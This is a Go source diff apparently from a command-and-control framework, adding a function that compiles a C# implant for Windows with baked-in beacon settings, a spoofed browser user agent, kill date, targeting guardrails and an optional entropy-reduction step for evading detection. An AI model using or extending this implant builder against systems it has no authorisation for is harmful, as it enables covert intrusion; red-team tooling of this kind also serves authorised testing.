@@ -1702,6 +1702,143 @@ func BuildNimELF(cfg BuildConfig, outDir string) (string, error) {
 	return outPath, nil
 }
 
+// csEscape returns s as a C# verbatim string literal body (escapes backslash and double-quote).
+func csEscape(s string) string {
+	s = strings.ReplaceAll(s, "\\", "\\\\")
+	s = strings.ReplaceAll(s, "\"", "\\\"")
+	return s
+}
+
+// BuildCSharpEXE compiles the C# agent using the Mono mcs compiler.
+// mcs produces a portable .NET 4.x IL assembly (.exe) that runs natively on
+// Windows .NET Framework 4.x — no additional runtime on the target is required
+// beyond what ships with every modern Windows install.
+func BuildCSharpEXE(cfg BuildConfig, outDir string) (string, error) {
+	mcs, err := findMCS()
+	if err != nil {
+		return "", err
+	}
+
+	root := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	agentDir := filepath.Join(root, "agents", "agent-csharp")
+	if _, err := os.Stat(filepath.Join(agentDir, "Agent.cs")); err != nil {
+		return "", fmt.Errorf("agent-csharp not found in %s", agentDir)
+	}
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
+	jitter := cfg.JitterPct
+	if jitter < 0 {
+		jitter = 20
+	}
+	transport := cfg.Transport
+	if transport == "" {
+		transport = "http"
+	}
+	ua := cfg.UserAgent
+	if ua == "" {
+		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+	}
+
+	outName := agentName(cfg, ".exe")
+	outPath := filepath.Join(outDir, outName)
+
+	// Generate Config.cs with all build-time constants
+	configCS := fmt.Sprintf(`// Auto-generated at build time — do not edit.
+static class Config
+{
+    public static string  ServerURL     = "%s";
+    public static string  Transport     = "%s";
+    public static int     SleepSec      = %d;
+    public static int     JitterPct     = %d;
+    public static string  UserAgent     = "%s";
+    public static string  BeaconURIs    = "%s";
+    public static string  PresetID      = "%s";
+    public static string  ParentID      = "%s";
+    public static string  BuildName     = "%s";
+    public static string  KillDate      = "%s";
+    public static string  WorkingHours  = "%s";
+    public static string  MaxRetry      = "%d";
+    public static string  GuardrailIP   = "%s";
+    public static string  GuardrailUser = "%s";
+    public static string  GuardrailHost = "%s";
+}
+`,
+		csEscape(cfg.ServerURL),
+		csEscape(transport),
+		sleepSec,
+		jitter,
+		csEscape(ua),
+		csEscape(cfg.BeaconURIs),
+		csEscape(cfg.PresetID),
+		csEscape(cfg.ParentID),
+		csEscape(outName),
+		csEscape(cfg.KillDate),
+		csEscape(cfg.WorkingHours),
+		cfg.MaxRetry,
+		csEscape(cfg.GuardrailIP),
+		csEscape(cfg.GuardrailUser),
+		csEscape(cfg.GuardrailHostname),
+	)
+
+	// Write Config.cs to a temp directory alongside Agent.cs
+	tmpDir, err := os.MkdirTemp("", "csharp-agent-*")
+	if err != nil {
+		return "", fmt.Errorf("tempdir: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	configPath := filepath.Join(tmpDir, "Config.cs")
+	if err := os.WriteFile(configPath, []byte(configCS), 0600); err != nil {
+		return "", fmt.Errorf("write Config.cs: %w", err)
+	}
+
+	agentSrc := filepath.Join(agentDir, "Agent.cs")
+
+	args := []string{
+		"-target:exe",
+		"-optimize+",
+		"-warn:0",
+		"-nowarn:414,168,219,67",
+		"-r:System.Drawing.dll",
+		"-out:" + outPath,
+		agentSrc,
+		configPath,
+	}
+
+	cmd := exec.Command(mcs, args...)
+	cmd.Dir = root
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("mcs build failed: %v\n%s", err, out)
+	}
+
+	if cfg.EntropyReduce {
+		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
+// findMCS locates the Mono C# compiler (mcs).
+func findMCS() (string, error) {
+	candidates := []string{"mcs", "/usr/bin/mcs", "/usr/local/bin/mcs"}
+	for _, c := range candidates {
+		if p, err := exec.LookPath(c); err == nil {
+			return p, nil
+		}
+		if _, err := os.Stat(c); err == nil {
+			return c, nil
+		}
+	}
+	return "", fmt.Errorf("mcs not found; install with: apt install mono-mcs")
+}
+
 func buildLDFlags(cfg BuildConfig) string {
 	var flags []string
 	flags = append(flags, "-s", "-w")
